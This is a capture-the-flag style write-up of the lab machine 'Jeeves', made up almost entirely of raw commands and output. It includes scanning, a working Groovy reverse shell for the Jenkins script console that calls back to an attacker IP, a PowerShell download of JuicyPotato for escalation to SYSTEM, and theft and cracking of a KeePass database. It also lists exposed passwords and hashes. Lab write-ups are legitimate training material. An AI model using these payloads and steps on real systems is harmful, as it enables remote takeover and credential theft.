

```
kali@kali ~> nmap -sC -sV -Pn 10.10.10.63
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 04:33 EDT
Nmap scan report for 10.10.10.63
Host is up (0.36s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-06-23T13:34:45
|_  start_date: 2024-06-23T13:30:55
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.71 seconds

```


```
kali@kali ~> ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.63:50000/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.63:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 133ms]

```



http://10.10.10.63:50000/askjeeves/computer/(master)/script


https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```groovy
String host="10.10.14.14";
int port=9111;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```








---

```

```


```
C:\Users\Administrator\.jenkins\tmp>powershell.exe iwr -uri 10.10.14.14:80/JuicyPotato.exe -o jp.exe
powershell.exe iwr -uri 10.10.14.14:80/JuicyPotato.exe -o jp.exe

C:\Users\Administrator\.jenkins\tmp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\.jenkins\tmp

06/23/2024  12:25 PM    <DIR>          .
06/23/2024  12:25 PM    <DIR>          ..
06/23/2024  12:25 PM           347,648 jp.exe
06/23/2024  11:54 AM           340,480 putty.exe
06/23/2024  11:57 AM           340,480 rotten.exe
06/23/2024  12:08 PM        10,020,352 test.exe
               4 File(s)     11,048,960 bytes
               2 Dir(s)   2,656,468,992 bytes free
```


```
C:\Users\Administrator\.jenkins\tmp>C:\Users\Administrator\.jenkins\tmp\jp.exe -t * -p C:\Users\Administrator\.jenkins\tmp\test.exe -l 443
C:\Users\Administrator\.jenkins\tmp\jp.exe -t * -p C:\Users\Administrator\.jenkins\tmp\test.exe -l 443
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\Administrator\.jenkins\tmp>
```


```
[server] sliver (SILKY_OBJECT) > ls

C:\users\kohsuke\documents (5 items, 3.2 KiB)
=============================================
-rw-rw-rw-  CEH.kdbx                                  2.8 KiB  Mon Sep 18 13:43:17 -0400 2017
-rw-rw-rw-  desktop.ini                               402 B    Fri Nov 03 23:15:51 -0400 2017
Lrw-rw-rw-  My Music -> C:\Users\kohsuke\Music        0 B      Fri Nov 03 22:50:40 -0400 2017
Lrw-rw-rw-  My Pictures -> C:\Users\kohsuke\Pictures  0 B      Fri Nov 03 22:50:40 -0400 2017
Lrw-rw-rw-  My Videos -> C:\Users\kohsuke\Videos      0 B      Fri Nov 03 22:50:40 -0400 2017


[server] sliver (SILKY_OBJECT) > download CEH.kdbx

[*] Wrote 2846 bytes (1 file successfully, 0 files unsuccessfully) to /home/kali/CEH.kdbx
```


John
```
kali@kali ~ [255]> john --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:17 0.07% (ETA: 14:53:35) 0g/s 702.7p/s 702.7c/s 702.7C/s myboo1..kakaka
moonshine1       (CEH)
```

with hashcat remove anything before the hash

```
kali@kali ~> cat CEH.hash
(CEH:)$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

```


```
 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
11/03/2017  10:03 PM               282 desktop.ini
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               3 File(s)          1,115 bytes
               2 Dir(s)   2,594,410,496 bytes free

```


```
PS E:\hashcat-6.2.6> .\hashcat.exe -m 13400 hash.txt rockyou.txt -O -D 2
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 AMD-APP (3608.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 3 secs

$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea<...SNIP..>:moonshine1   <-------------------- password

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea...47db48
Time.Started.....: Sun Jun 23 16:51:33 2024 (3 secs)
Time.Estimated...: Sun Jun 23 16:51:36 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    28940 H/s (7.49ms) @ Accel:16 Loops:1024 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 57344/14344384 (0.40%)
Rejected.........: 0/57344 (0.00%)
Restore.Point....: 50176/14344384 (0.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5120-6000
Candidate.Engine.: Device Generator
Candidates.#1....: 150985 -> XIOMARA
Hardware.Mon.#1..: Temp: 54c Fan:  0% Util: 10% Core: 277MHz Mem:1074MHz Bus:8

Started: Sun Jun 23 16:50:45 2024
Stopped: Sun Jun 23 16:51:37 2024
```

```
C:\Users\Administrator\Desktop> powershell Get-Content -Path "hm.txt" -Stream "root.txt"
afbc5bd4b615a60648cec41c6ac92530
```


```
Administrator:S1TjAtJHKsugh9oC4VZl
```

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```



https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
https://hashcat.net/wiki/doku.php?id=example_hashes